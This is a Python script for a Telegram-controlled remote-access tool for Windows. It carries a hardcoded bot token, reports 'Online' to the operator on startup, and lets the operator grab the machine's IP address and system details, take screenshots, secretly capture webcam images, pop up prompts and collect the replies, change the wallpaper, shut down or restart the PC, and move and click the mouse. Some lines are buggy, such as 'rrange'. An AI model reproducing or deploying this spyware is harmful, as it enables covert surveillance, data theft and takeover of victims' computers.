import telebot
from telebot import types
import requests
import cv2
import ctypes
import pyautogui as pag
import platform as pf
import os
import sqlite3

pag.FAILSAFE = False
TOKEN = "1667255041:AAFuTpS2M594DhDCiYlDpA3B8E0GA3AJYwU"
CHAT_ID = "3779764"
client = telebot.TeleBot(TOKEN)
pr = 0
vn = 0

requests.post("https://api.telegram.org/bot{1667255041:AAFuTpS2M594DhDCiYlDpA3B8E0GA3AJYwU}/sendMessage?chat_id={3779764}&text=Online")

@client.message_handler(commands = ["start"])
def start(message):
 rmk = types.ReplyKeyboardMarkup(resize_keyboard = True)
 btns = ["/ip", "/spec", "/screenshot", "/webcam",
 "/message", "/input", "/wallpaper", "/pc_off", "/pc_pere" ,
  "/vn_n", "/vn_n-", "/vp_p", "/vp_p-", "/cl_l", "/scr"]

 for btn in btns:
    rmk.add(types.KeyboardButton(btn))
    client.send_message(message.chat.id, "лошара", reply_markup = rmk)

@client.message_handler(commands = ["ip", "ip_address"])
def ip_address(message):
 response = requests.get("http://jsonip.com/").json()
 client.send_message(message.chat.id, f"IP Address: {response['ip']}")


@client.message_handler(commands = ["spec", "specifications"])
def spec(message):
 msg = f"Name PC: {pf.node()}\nProcessor: {pf.processor()}\nSystem: {pf.system()} {pf.release()}"
 client.send_message(message.chat.id, msg)

@client.message_handler(commands = ["screenshot"])
def screenshot(message):
    pag.screenshot("001.jpg")

    with open("001.jpg", "rb") as img:
        client.send_photo(message.chat.id, img)

@client.message_handler(commands = ["webcam"])
def webcam(message):
 cap = cv2.VideoCapture(0)

 for i in rrange(30):
     cap.read()

 ret, frame = cap.read()

 cv2.imwrite("cam.jpg", frame)
 cap.release()

 with open("cam.jpg", "rb") as img:
     client.send_photo(message.chat.id, img)

@client.message_handler(commands = ["message"])
def message_sending(message):
 msg = client.send_message(message.chat.id, "s")
 client.register_next_step_handler(msg, next_message_sending)

def next_message_sending(message):
        try:
                pag.alert(message.text, "~")
        except Exception:
                client.send_message(message.chat.id, "")

@client.message_handler(commands = ["input"])
def message_sending_with_input(message):
    msg = client.send_message(message.chat.id, "s")
    client.register_next_step_handler(msg, next_message_sending_with_input)

def next_message_sending_with_input(message):
        try:
                answer = pag.prompt(message.text, "~")
                client.send_message(message.chat.id, answer)
        except Exception:
                client.send_message(message.chat.id, "")

@client.message_handler(commands = ["wallpaper"])
def wallpaper(message):
 msg = client.send_message(message.chat.id, "a")
 client.register_next_step_handler(msg, next_wallpaper)

@client.message_handler(content_types = ["photo"])
def next_wallpaper(message):
        file = message.photo[-1].file_id
        file = client.get_file(file)
        dfile = client.download_file(file.file_path)

        with open("image.jpg", "wb") as img:
                img.write(dfile)

        path = os.path.abspath("image.jpg")
        ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)

@client.message_handler(commands = ['pc_off', "off"])
def off(message):
    client.send_message(message.chat.id, "Let's go ...")
    os.system("shutdown /s /t 1")

@client.message_handler(commands = ['pc_pere', "peregr"])
def peregr(message):
    client.send_message(message.chat.id, "Пока!")
    os.system("shutdown /r /t 1")

@client.message_handler(commands = ["scr", "vry"])
def vry (message):
    msg = client.send_message(message.chat.id, "gg")
    client.register_next_step_handler(msg, nexts)
def nexts(message):
    global x
    #a = message.text
    #print(a)
    #s = a
    x = message.text
    #my_dict = {}
    #x = message.text
    #my_dict[x] = a



@client.message_handler(commands = ['vn_n', "vniz"])
def vniz(message):
    global x
    global pr
    global vn
    vn+=int(x)
    pag.moveTo (pr,vn)
    client.send_message(message.chat.id,vn)
@client.message_handler(commands = ['vn_n-', "vniz1"])
def vniz1(message):
    global x
    global pr
    global vn
    vn-=int(x)
    pag.moveTo (pr,vn)
    client.send_message(message.chat.id,vn)

@client.message_handler(commands = ['vp_p', "vparo"])
def vparo(message):
    global x
    global pr
    global vn
    pr+=int(x)
    pag.moveTo (pr,vn)
    client.send_message(message.chat.id,pr)

@client.message_handler(commands = ['vp_p-', "vparo1"])
def vparo1(message):
    global x 
    global pr
    global vn
    pr-=int(x)
    pag.moveTo (pr,vn)
    client.send_message(message.chat.id,pr)

@client.message_handler(commands = ['cl_l', "cl"])
def cl(message):
    pag.click(button = "left")
    client.send_message(message.chat.id, "Клик")

client.polling()
#my_dict = {}
#x = "Buffalo"
#my_dict[x] = 4
